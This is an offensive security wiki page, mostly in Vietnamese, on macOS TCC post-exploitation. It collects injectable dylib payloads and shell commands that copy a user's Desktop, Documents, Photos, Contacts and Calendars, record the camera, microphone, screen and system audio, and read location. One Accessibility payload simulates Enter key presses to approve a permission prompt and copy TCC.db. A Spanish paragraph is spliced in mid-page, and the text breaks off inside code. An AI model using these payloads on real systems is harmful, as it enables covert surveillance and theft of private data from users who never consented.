# Payload TCC trên macOS

{{#include ../../../../banners/hacktricks-training.md}}

> [!TIP]
> Các quyết định của TCC gắn với **danh tính của tiến trình** yêu cầu quyền truy cập tài nguyên. Trong post-exploitation, mục tiêu thường là **inject các payload này vào một ứng dụng đã được cấp quyền** (hoặc thực thi chúng trong bundle / ngữ cảnh chữ ký của ứng dụng đó) thay vì chạy một helper mới khiến hệ thống hiển thị lời nhắc riêng.
>
> Đối với **Screen Recording**, **Input Monitoring** và **synthetic input**, các phiên bản macOS hiện đại cũng cung cấp các API preflight / request cụ thể như `CGPreflightScreenCaptureAccess`, `CGRequestScreenCaptureAccess`, `CGRequestListenEventAccess` và `CGRequestPostEventAccess`.

> [!WARNING]
> Đây vẫn là một hướng tấn công rất thực tế: nghiên cứu gần đây về đánh cắp quyền trên các ứng dụng macOS của Microsoft cho thấy **library validation yếu / tải plugin** có thể cho phép kẻ tấn công tái sử dụng các quyền TCC **camera**, **microphone** và các quyền khác mà ứng dụng nạn nhân đã được cấp mà không cần hiển thị lời nhắc lần nữa.<sup>[[1]](#references)</sup>

## Phân loại nhanh trước khi dùng payload

Nghiên cứu gần đây về đánh cắp quyền liên tục củng cố cùng một quy trình: trước tiên tìm một ứng dụng đã có quyền TCC bạn muốn, sau đó xác minh rằng ứng dụng đó là mục tiêu injection khả thi.<sup>[[1]](#references)</sup>

```bash
sqlite3 "$HOME/Library/Application Support/com.apple.TCC/TCC.db" \
  "select service, client from access where auth_value=2 and service in ('kTCCServiceCamera','kTCCServiceMicrophone','kTCCServiceScreenCapture','kTCCServiceAccessibility') order by service, client;"

codesign -d --entitlements :- /Applications/Target.app 2>/dev/null | \
  egrep 'disable-library-validation|allow-dyld-environment-variables'
```

Si el objetivo también carga plug-ins o frameworks controlados por el atacante, estos payloads se vuelven mucho más interesantes. Para obtener más ideas de post-explotación después de entrar en un proceso que ya cuenta con aprobación, consulta [esta página relacionada](macos-tcc-credential-and-data-theft.md).

### Escritorio

- **Entitlement**: Ninguno
- **TCC**: kTCCServiceSystemPolicyDesktopFolder

{{#tabs}}
{{#tab name="ObjetiveC"}}
Copia `$HOME/Desktop` a `/tmp/desktop`.

```objectivec
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>

// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
    freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt

    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSError *error = nil;

    // Get the path to the user's Pictures folder
    NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Desktop"];
    NSString *tmpPhotosPath = @"/tmp/desktop";

    // Copy the contents recursively
    if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
        NSLog(@"Error copying items: %@", error);
    }

    NSLog(@"Copy completed successfully.", error);

    fclose(stderr); // Close the file stream
}
```

{{#endtab}}

{{#tab name="Shell"}}
Sao chép `$HOME/Desktop` vào `/tmp/desktop`.

```bash
cp -r "$HOME/Desktop" "/tmp/desktop"
```

{{#endtab}}
{{#endtabs}}

### Tài liệu

- **Entitlement**: Không
- **TCC**: `kTCCServiceSystemPolicyDocumentsFolder`

{{#tabs}}
{{#tab name="ObjetiveC"}}
Sao chép `$HOME/Documents` vào `/tmp/documents`.

```objectivec
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>

// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
    freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt

    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSError *error = nil;

    // Get the path to the user's Pictures folder
    NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
    NSString *tmpPhotosPath = @"/tmp/documents";

    // Copy the contents recursively
    if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
        NSLog(@"Error copying items: %@", error);
    }

    NSLog(@"Copy completed successfully.", error);

    fclose(stderr); // Close the file stream
}
```

{{#endtab}}

{{#tab name="Shell"}}
Sao chép `$HOME/`Documents vào `/tmp/documents`.

```bash
cp -r "$HOME/Documents" "/tmp/documents"
```

{{#endtab}}
{{#endtabs}}

### Tệp tải xuống

- **Entitlement**: None
- **TCC**: `kTCCServiceSystemPolicyDownloadsFolder`

{{#tabs}}
{{#tab name="ObjetiveC"}}
Sao chép `$HOME/Downloads` vào `/tmp/downloads`.

```objectivec
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>

// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
    freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt

    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSError *error = nil;

    // Get the path to the user's Pictures folder
    NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Downloads"];
    NSString *tmpPhotosPath = @"/tmp/downloads";

    // Copy the contents recursively
    if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
        NSLog(@"Error copying items: %@", error);
    }

    NSLog(@"Copy completed successfully.", error);

    fclose(stderr); // Close the file stream
}
```

{{#endtab}}

{{#tab name="Shell"}}
Sao chép `$HOME/Downloads` vào `/tmp/downloads`.

```bash
cp -r "$HOME/Downloads" "/tmp/downloads"
```

{{#endtab}}
{{#endtabs}}

### Thư viện Ảnh

- **Entitlement**: `com.apple.security.personal-information.photos-library`
- **TCC**: `kTCCServicePhotos`

{{#tabs}}
{{#tab name="ObjetiveC"}}
Sao chép `$HOME/Pictures/Photos Library.photoslibrary` vào `/tmp/photos`.

```objectivec
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>

// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
    freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt

    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSError *error = nil;

    // Get the path to the user's Pictures folder
    NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Pictures/Photos Library.photoslibrary"];
    NSString *tmpPhotosPath = @"/tmp/photos";

    // Copy the contents recursively
    if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
        NSLog(@"Error copying items: %@", error);
    }

    NSLog(@"Copy completed successfully.", error);

    fclose(stderr); // Close the file stream
}
```

{{#endtab}}

{{#tab name="Shell"}}
Sao chép `$HOME/Pictures/Photos Library.photoslibrary` vào `/tmp/photos`.

```bash
cp -r "$HOME/Pictures/Photos Library.photoslibrary" "/tmp/photos"
```

{{#endtab}}
{{#endtabs}}

### Danh bạ

- **Entitlement**: `com.apple.security.personal-information.addressbook`
- **TCC**: `kTCCServiceAddressBook`

{{#tabs}}
{{#tab name="ObjetiveC"}}
Sao chép `$HOME/Library/Application Support/AddressBook` vào `/tmp/contacts`.

```objectivec
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>

// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
    freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt

    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSError *error = nil;

    // Get the path to the user's Pictures folder
    NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Library/Application Support/AddressBook"];
    NSString *tmpPhotosPath = @"/tmp/contacts";

    // Copy the contents recursively
    if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
        NSLog(@"Error copying items: %@", error);
    }

    NSLog(@"Copy completed successfully.", error);

    fclose(stderr); // Close the file stream
}
```

{{#endtab}}

{{#tab name="Shell"}}
Sao chép `$HOME/Library/Application Support/AddressBook` vào `/tmp/contacts`.

```bash
cp -r "$HOME/Library/Application Support/AddressBook" "/tmp/contacts"
```

{{#endtab}}
{{#endtabs}}

### Lịch

- **Entitlement**: `com.apple.security.personal-information.calendars`
- **TCC**: `kTCCServiceCalendar`

{{#tabs}}
{{#tab name="ObjectiveC"}}
Sao chép `$HOME/Library/Calendars` vào `/tmp/calendars`.

```objectivec
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>

// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
    freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt

    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSError *error = nil;

    // Get the path to the user's Pictures folder
    NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Library/Calendars/"];
    NSString *tmpPhotosPath = @"/tmp/calendars";

    // Copy the contents recursively
    if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
        NSLog(@"Error copying items: %@", error);
    }

    NSLog(@"Copy completed successfully.", error);

    fclose(stderr); // Close the file stream
}
```

{{#endtab}}

{{#tab name="Shell"}}
Sao chép `$HOME/Library/Calendars` vào `/tmp/calendars`.

```bash
cp -r "$HOME/Library/Calendars" "/tmp/calendars"
```

{{#endtab}}
{{#endtabs}}

### Camera

- **Entitlement**: `com.apple.security.device.camera`
- **TCC**: `kTCCServiceCamera`

{{#tabs}}
{{#tab name="ObjetiveC - Record"}}
Quay video dài 3 giây và lưu vào **`/tmp/recording.mov`**<sup>[[5]](#references)</sup>

```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>

// gcc -framework Foundation -framework AVFoundation -dynamiclib CamTest.m -o CamTest.dylib
// Code from: https://vsociety.medium.com/cve-2023-26818-macos-tcc-bypass-with-telegram-using-dylib-injection-part1-768b34efd8c4

@interface VideoRecorder : NSObject <AVCaptureFileOutputRecordingDelegate>
@property (strong, nonatomic) AVCaptureSession *captureSession;
@property (strong, nonatomic) AVCaptureDeviceInput *videoDeviceInput;
@property (strong, nonatomic) AVCaptureMovieFileOutput *movieFileOutput;
- (void)startRecording;
- (void)stopRecording;
@end
@implementation VideoRecorder
- (instancetype)init {
    self = [super init];
    if (self) {
        [self setupCaptureSession];
    }
    return self;
}
- (void)setupCaptureSession {
    self.captureSession = [[AVCaptureSession alloc] init];
    self.captureSession.sessionPreset = AVCaptureSessionPresetHigh;
    AVCaptureDevice *videoDevice = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
    NSError *error;
    self.videoDeviceInput = [[AVCaptureDeviceInput alloc] initWithDevice:videoDevice error:&error];
    if (error) {
        NSLog(@"Error setting up video device input: %@", [error localizedDescription]);
        return;
    }
    if ([self.captureSession canAddInput:self.videoDeviceInput]) {
        [self.captureSession addInput:self.videoDeviceInput];
    }
    self.movieFileOutput = [[AVCaptureMovieFileOutput alloc] init];
    if ([self.captureSession canAddOutput:self.movieFileOutput]) {
        [self.captureSession addOutput:self.movieFileOutput];
    }
}
- (void)startRecording {
    [self.captureSession startRunning];
    NSString *outputFilePath = @"/tmp/recording.mov";
    NSURL *outputFileURL = [NSURL fileURLWithPath:outputFilePath];
    [self.movieFileOutput startRecordingToOutputFileURL:outputFileURL recordingDelegate:self];
    NSLog(@"Recording started");
}
- (void)stopRecording {
    [self.movieFileOutput stopRecording];
    [self.captureSession stopRunning];
    NSLog(@"Recording stopped");
}
#pragma mark - AVCaptureFileOutputRecordingDelegate
- (void)captureOutput:(AVCaptureFileOutput *)captureOutput
didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL
      fromConnections:(NSArray<AVCaptureConnection *> *)connections
                error:(NSError *)error {
    if (error) {
        NSLog(@"Recording failed: %@", [error localizedDescription]);
    } else {
        NSLog(@"Recording finished successfully. Saved to %@", outputFileURL.path);
    }
}
@end
__attribute__((constructor))
static void myconstructor(int argc, const char **argv) {
    freopen("/tmp/logs.txt", "a", stderr);
    VideoRecorder *videoRecorder = [[VideoRecorder alloc] init];
    [videoRecorder startRecording];
    [NSThread sleepForTimeInterval:3.0];
    [videoRecorder stopRecording];
    [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:3.0]];
    fclose(stderr); // Close the file stream
}
```

{{#endtab}}

{{#tab name="ObjectiveC - Check"}}
Kiểm tra xem chương trình có quyền truy cập camera hay không.<sup>[[5]](#references)</sup>

```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>

// gcc -framework Foundation -framework AVFoundation -dynamiclib CamTest.m -o CamTest.dylib
// Code from https://vsociety.medium.com/cve-2023-26818-macos-tcc-bypass-with-telegram-using-dylib-injection-part1-768b34efd8c4

@interface CameraAccessChecker : NSObject
+ (BOOL)hasCameraAccess;
@end
@implementation CameraAccessChecker
+ (BOOL)hasCameraAccess {
    AVAuthorizationStatus status = [AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeVideo];
    if (status == AVAuthorizationStatusAuthorized) {
        NSLog(@"[+] Access to camera granted.");
        return YES;
    } else {
        NSLog(@"[-] Access to camera denied.");
        return NO;
    }
}
@end
__attribute__((constructor))
static void telegram(int argc, const char **argv) {
    freopen("/tmp/logs.txt", "a", stderr);
    [CameraAccessChecker hasCameraAccess];
    fclose(stderr); // Close the file stream
}
```

{{#endtab}}

{{#tab name="ObjectiveC - Prompt"}}
Kích hoạt lời nhắc camera nếu tiến trình hiện tại vẫn ở trạng thái `NotDetermined`.<sup>[[3]](#references)</sup>

```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>
#import <dispatch/dispatch.h>
__attribute__((constructor))
static void camprompt(int argc, const char **argv) {
    if ([AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeVideo] != AVAuthorizationStatusNotDetermined) return;
    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    [AVCaptureDevice requestAccessForMediaType:AVMediaTypeVideo completionHandler:^(BOOL granted) {
        NSLog(@"Camera prompt result: %@", granted ? @"granted" : @"denied");
        dispatch_semaphore_signal(sem);
    }];
    dispatch_semaphore_wait(sem, DISPATCH_TIME_FOREVER);
}
```

{{#endtab}}

{{#tab name="Shell"}}
Chụp ảnh bằng camera

```bash
ffmpeg -framerate 30 -f avfoundation -i "0" -frames:v 1 /tmp/capture.jpg
```

{{#endtab}}
{{#endtabs}}

### Micrô

- **Quyền**: **com.apple.security.device.audio-input**
- **TCC**: `kTCCServiceMicrophone`

{{#tabs}}
{{#tab name="ObjetiveC - Record"}}
Ghi âm trong 5 giây và lưu vào `/tmp/recording.m4a`<sup>[[6]](#references)</sup>

```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>

// Code from https://www.vicarius.io/vsociety/posts/cve-2023-26818-exploit-macos-tcc-bypass-w-telegram-part-1-2
// gcc -dynamiclib -framework Foundation -framework AVFoundation Micexploit.m -o Micexploit.dylib

@interface AudioRecorder : NSObject <AVCaptureFileOutputRecordingDelegate>

@property (strong, nonatomic) AVCaptureSession *captureSession;
@property (strong, nonatomic) AVCaptureDeviceInput *audioDeviceInput;
@property (strong, nonatomic) AVCaptureMovieFileOutput *audioFileOutput;

- (void)startRecording;
- (void)stopRecording;

@end

@implementation AudioRecorder

- (instancetype)init {
    self = [super init];
    if (self) {
        [self setupCaptureSession];
    }
    return self;
}

- (void)setupCaptureSession {
    self.captureSession = [[AVCaptureSession alloc] init];
    self.captureSession.sessionPreset = AVCaptureSessionPresetHigh;

    AVCaptureDevice *audioDevice = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeAudio];
    NSError *error;
    self.audioDeviceInput = [[AVCaptureDeviceInput alloc] initWithDevice:audioDevice error:&error];

    if (error) {
        NSLog(@"Error setting up audio device input: %@", [error localizedDescription]);
        return;
    }

    if ([self.captureSession canAddInput:self.audioDeviceInput]) {
        [self.captureSession addInput:self.audioDeviceInput];
    }

    self.audioFileOutput = [[AVCaptureMovieFileOutput alloc] init];

    if ([self.captureSession canAddOutput:self.audioFileOutput]) {
        [self.captureSession addOutput:self.audioFileOutput];
    }
}

- (void)startRecording {
    [self.captureSession startRunning];
    NSString *outputFilePath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"recording.m4a"];
    NSURL *outputFileURL = [NSURL fileURLWithPath:outputFilePath];
    [self.audioFileOutput startRecordingToOutputFileURL:outputFileURL recordingDelegate:self];
    NSLog(@"Recording started");
}

- (void)stopRecording {
    [self.audioFileOutput stopRecording];
    [self.captureSession stopRunning];
    NSLog(@"Recording stopped");
}

#pragma mark - AVCaptureFileOutputRecordingDelegate

- (void)captureOutput:(AVCaptureFileOutput *)captureOutput
didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL
      fromConnections:(NSArray<AVCaptureConnection *> *)connections
                error:(NSError *)error {
    if (error) {
        NSLog(@"Recording failed: %@", [error localizedDescription]);
    } else {
        NSLog(@"Recording finished successfully. Saved to %@", outputFileURL.path);
    }
    NSLog(@"Saved to %@", outputFileURL.path);
}

@end

__attribute__((constructor))
static void myconstructor(int argc, const char **argv) {

    freopen("/tmp/logs.txt", "a", stderr);
    AudioRecorder *audioRecorder = [[AudioRecorder alloc] init];

    [audioRecorder startRecording];
    [NSThread sleepForTimeInterval:5.0];
    [audioRecorder stopRecording];

    [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]];
    fclose(stderr); // Close the file stream
}
```

{{#endtab}}

{{#tab name="ObjectiveC - Check"}}
Kiểm tra xem ứng dụng có quyền truy cập vào microphone hay không.<sup>[[5]](#references)</sup>

```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>

// From https://vsociety.medium.com/cve-2023-26818-macos-tcc-bypass-with-telegram-using-dylib-injection-part1-768b34efd8c4
// gcc -framework Foundation -framework AVFoundation -dynamiclib MicTest.m -o MicTest.dylib

@interface MicrophoneAccessChecker : NSObject
+ (BOOL)hasMicrophoneAccess;
@end
@implementation MicrophoneAccessChecker
+ (BOOL)hasMicrophoneAccess {
    AVAuthorizationStatus status = [AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeAudio];
    if (status == AVAuthorizationStatusAuthorized) {
        NSLog(@"[+] Access to microphone granted.");
        return YES;
    } else {
        NSLog(@"[-] Access to microphone denied.");
        return NO;
    }
}
@end
__attribute__((constructor))
static void telegram(int argc, const char **argv) {
    [MicrophoneAccessChecker hasMicrophoneAccess];
}
```

{{#endtab}}

{{#tab name="ObjectiveC - Prompt"}}
Kích hoạt lời nhắc cấp quyền microphone nếu tiến trình hiện tại vẫn ở trạng thái `NotDetermined`.<sup>[[3]](#references)</sup>

```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>
#import <dispatch/dispatch.h>
__attribute__((constructor))
static void micprompt(int argc, const char **argv) {
    if ([AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeAudio] != AVAuthorizationStatusNotDetermined) return;
    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    [AVCaptureDevice requestAccessForMediaType:AVMediaTypeAudio completionHandler:^(BOOL granted) {
        NSLog(@"Microphone prompt result: %@", granted ? @"granted" : @"denied");
        dispatch_semaphore_signal(sem);
    }];
    dispatch_semaphore_wait(sem, DISPATCH_TIME_FOREVER);
}
```

{{#endtab}}

{{#tab name="Shell"}}
Ghi âm trong 5 giây và lưu vào `/tmp/recording.wav`

```bash
# Check the microphones
ffmpeg -f avfoundation -list_devices true -i ""
# Use microphone from index 1 from the previous list to record
ffmpeg -f avfoundation -i ":1" -t 5 /tmp/recording.wav
```

{{#endtab}}
{{#endtabs}}

### Âm thanh hệ thống (Core Audio process taps)

- **Entitlement**: Không có entitlement chuyên dụng để ghi âm thanh hệ thống cho client không bị sandbox (các hạn chế sandbox thông thường vẫn áp dụng)
- **Mô tả mục đích sử dụng**: `NSAudioCaptureUsageDescription`
- **TCC**: Ghi âm thanh hệ thống (độc lập với quyền Microphone)

Trên **macOS 14.2+**, Core Audio process taps có thể sao chép âm thanh đầu ra của các process được chọn, một nhóm process hoặc bản trộn toàn cục mà không cần cài đặt virtual loopback driver. Chuỗi cấp thấp là `CATapDescription` -> `AudioHardwareCreateProcessTap` -> thiết bị aggregate riêng -> `AudioDeviceIOProc`; lần đầu thử ghi âm thông qua aggregate có chứa tap sẽ khiến macOS yêu cầu quyền Ghi âm thanh hệ thống. Bundle phải chứa `NSAudioCaptureUsageDescription`, nếu không quy trình đồng ý sẽ không hoạt động chính xác.<sup>[[7]](#references)</sup>

Để tạo payload nhanh, [`catap`](https://github.com/sbetko/catap) bao bọc tap, thiết bị aggregate, IO callback, WAV writer và vòng đời dọn dẹp:<sup>[[8]](#references)</sup>

```bash
python3 -m venv /tmp/catap-env
source /tmp/catap-env/bin/activate
pip install catap
catap list-apps
catap record Safari -d 10 -o /tmp/safari.wav
catap record --system -d 10 -o /tmp/system-mix.wav
```

> [!WARNING]
> TCC ghi nhận thao tác thu âm từ CLI thuộc về **ứng dụng terminal lưu trữ**, chứ không chỉ riêng tiến trình Python. Nếu không có quyền System Audio Recording, đồ thị Core Audio vẫn có thể khởi chạy và cung cấp các buffer có kích thước chính xác nhưng **chỉ chứa các giá trị 0**, rất dễ khiến bạn lầm tưởng việc thu âm mục tiêu yên tĩnh đang hoạt động. Hãy cấp quyền cho ứng dụng lưu trữ, khởi động lại ứng dụng đó và thử lại với một nguồn âm thanh đã biết; `catap` cũng báo khi bản ghi chỉ chứa khoảng lặng.<sup>[[8]](#references)</sup>

### Vị trí

> [!TIP]
> Để ứng dụng lấy được vị trí, **Location Services** (trong Privacy & Security) **phải được bật**; nếu không, ứng dụng sẽ không thể truy cập.

- **Entitlement**: `com.apple.security.personal-information.location`
- **TCC**: Được cấp trong `/var/db/locationd/clients.plist`

{{#tabs}}
{{#tab name="ObjectiveC"}}
Ghi vị trí vào `/tmp/logs.txt`

```objectivec
#include <syslog.h>
#include <stdio.h>
#import <Foundation/Foundation.h>
#import <CoreLocation/CoreLocation.h>

@interface LocationManagerDelegate : NSObject <CLLocationManagerDelegate>
@end

@implementation LocationManagerDelegate

- (void)locationManager:(CLLocationManager *)manager didUpdateLocations:(NSArray<CLLocation *> *)locations {
    CLLocation *location = [locations lastObject];
    NSLog(@"Current location: %@", location);
    exit(0); // Exit the program after receiving the first location update
}

- (void)locationManager:(CLLocationManager *)manager didFailWithError:(NSError *)error {
    NSLog(@"Error getting location: %@", error);
    exit(1); // Exit the program on error
}

@end

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
    freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt

    NSLog(@"Getting location");
    CLLocationManager *locationManager = [[CLLocationManager alloc] init];
    LocationManagerDelegate *delegate = [[LocationManagerDelegate alloc] init];
    locationManager.delegate = delegate;

    [locationManager requestWhenInUseAuthorization]; // or use requestAlwaysAuthorization
    [locationManager startUpdatingLocation];

    NSRunLoop *runLoop = [NSRunLoop currentRunLoop];
    while (true) {
        [runLoop runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]];
    }

    NSLog(@"Location completed successfully.");
    freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
}
```

{{#endtab}}

{{#tab name="Shell"}}
Lấy vị trí hiện tại từ shell.<sup>[[2]](#references)</sup>

```bash
# Fast option: use a dedicated CoreLocation CLI helper
brew install --cask corelocationcli
CoreLocationCLI --json

# Keep printing updates while the device moves
CoreLocationCLI --watch --format '%latitude %longitude %speed %time'
```

> [!TIP]
> Điều này vẫn phụ thuộc vào việc **Location Services** được bật và công cụ / terminal được TCC phê duyệt. `CoreLocationCLI` cũng dựa vào định vị hỗ trợ qua Wi-Fi trên hầu hết máy Mac, vì vậy tắt Wi-Fi thường dẫn đến `kCLErrorDomain error 0`.

{{#endtab}}
{{#endtabs}}

### Ghi màn hình

- **Entitlement**: Không có
- **TCC**: `kTCCServiceScreenCapture`

{{#tabs}}
{{#tab name="ObjectiveC"}}
Ghi màn hình chính trong 5 giây vào `/tmp/screen.mov`

```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>

// clang -framework Foundation -framework AVFoundation -framework CoreVideo -framework CoreMedia -framework CoreGraphics -o ScreenCapture ScreenCapture.m

@interface MyRecordingDelegate : NSObject <AVCaptureFileOutputRecordingDelegate>
@end

@implementation MyRecordingDelegate

- (void)captureOutput:(AVCaptureFileOutput *)output
    didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL
    fromConnections:(NSArray *)connections
    error:(NSError *)error {
    if (error) {
        NSLog(@"Recording error: %@", error);
    } else {
        NSLog(@"Recording finished successfully.");
    }
    exit(0);
}

@end

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
    freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
    AVCaptureSession *captureSession = [[AVCaptureSession alloc] init];
    AVCaptureScreenInput *screenInput = [[AVCaptureScreenInput alloc] initWithDisplayID:CGMainDisplayID()];
    if ([captureSession canAddInput:screenInput]) {
        [captureSession addInput:screenInput];
    }

    AVCaptureMovieFileOutput *fileOutput = [[AVCaptureMovieFileOutput alloc] init];
    if ([captureSession canAddOutput:fileOutput]) {
        [captureSession addOutput:fileOutput];
    }

    [captureSession startRunning];

    MyRecordingDelegate *delegate = [[MyRecordingDelegate alloc] init];
    [fileOutput startRecordingToOutputFileURL:[NSURL fileURLWithPath:@"/tmp/screen.mov"] recordingDelegate:delegate];

    // Run the loop for 5 seconds to capture
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        [fileOutput stopRecording];
    });

    CFRunLoopRun();
    freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
}
```

{{#endtab}}

{{#tab name="ObjectiveC - Check / Prompt"}}
Kiểm tra xem tiến trình hiện tại có thể chụp màn hình hay không và kích hoạt lời nhắc TCC nếu cần.

```objectivec
#import <Foundation/Foundation.h>
#import <CoreGraphics/CoreGraphics.h>

// clang -framework Foundation -framework CoreGraphics -dynamiclib ScreenCheck.m -o ScreenCheck.dylib

__attribute__((constructor))
static void screencheck(int argc, const char **argv) {
    freopen("/tmp/logs.txt", "a", stderr);
    BOOL allowed = CGPreflightScreenCaptureAccess();
    if (!allowed) {
        allowed = CGRequestScreenCaptureAccess();
    }
    NSLog(@"Screen capture access: %@", allowed ? @"granted" : @"denied");
    fclose(stderr);
}
```

{{#endtab}}

{{#tab name="Shell"}}
Ghi lại màn hình chính trong 5 giây

```bash
screencapture -V 5 /tmp/screen.mov
```

{{#endtab}}
{{#endtabs}}

> [!TIP]
> Trên **macOS 12.3+**, `ScreenCaptureKit` thường là primitive hậu khai thác tốt hơn `AVCaptureScreenInput`: nó hỗ trợ streaming hiệu suất cao, chụp từng khung hình bằng `SCScreenshotManager` và streaming **âm thanh hệ thống**. Các bản cập nhật `ScreenCaptureKit` gần đây cũng bổ sung `captureMicrophone` / `microphoneCaptureDeviceID` cho `SCStreamConfiguration` cùng `SCRecordingOutput` để ghi trực tiếp ra tệp, nhờ đó một client ghi màn hình bị chiếm quyền có thể lưu trực tiếp màn hình + âm thanh hệ thống, đồng thời thêm âm thanh mic khi tiến trình cũng có `kTCCServiceMicrophone`.<sup>[[4]](#references)</sup> Để biết thêm các primitive lạm dụng phiên desktop, xem [trang liên quan này](../macos-input-monitoring-screen-capture-accessibility.md).

### Accessibility

- **Entitlement**: Không có
- **TCC**: `kTCCServiceAccessibility`

Dùng quyền TCC để chấp nhận thao tác điều khiển Finder bằng cách nhấn Enter và vượt qua TCC theo cách đó

{{#tabs}}
{{#tab name="Accept TCC"}}

```objectivec
#import <Foundation/Foundation.h>
#import <ApplicationServices/ApplicationServices.h>
#import <OSAKit/OSAKit.h>

// clang -framework Foundation -framework ApplicationServices -framework OSAKit -o ParallelScript ParallelScript.m
// TODO: Improve to monitor the foreground app and press enter when TCC appears

void SimulateKeyPress(CGKeyCode keyCode) {
    CGEventRef keyDownEvent = CGEventCreateKeyboardEvent(NULL, keyCode, true);
    CGEventRef keyUpEvent = CGEventCreateKeyboardEvent(NULL, keyCode, false);
    CGEventPost(kCGHIDEventTap, keyDownEvent);
    CGEventPost(kCGHIDEventTap, keyUpEvent);
    if (keyDownEvent) CFRelease(keyDownEvent);
    if (keyUpEvent) CFRelease(keyUpEvent);
}

void RunAppleScript() {
    NSLog(@"Starting AppleScript");
    NSString *scriptSource = @"tell application \"Finder\"\n"
                             "set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias\n"
                             "set targetFolder to POSIX file \"/tmp\" as alias\n"
                             "duplicate file sourceFile to targetFolder with replacing\n"
                             "end tell\n";

    NSDictionary *errorDict = nil;
    NSAppleScript *appleScript = [[NSAppleScript alloc] initWithSource:scriptSource];
    [appleScript executeAndReturnError:&errorDict];

    if (errorDict) {
        NSLog(@"AppleScript Error: %@", errorDict);
    }
}

int main() {
    @autoreleasepool {
        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
            RunAppleScript();
        });

        // Simulate pressing the Enter key every 0.1 seconds
        NSLog(@"Starting key presses");
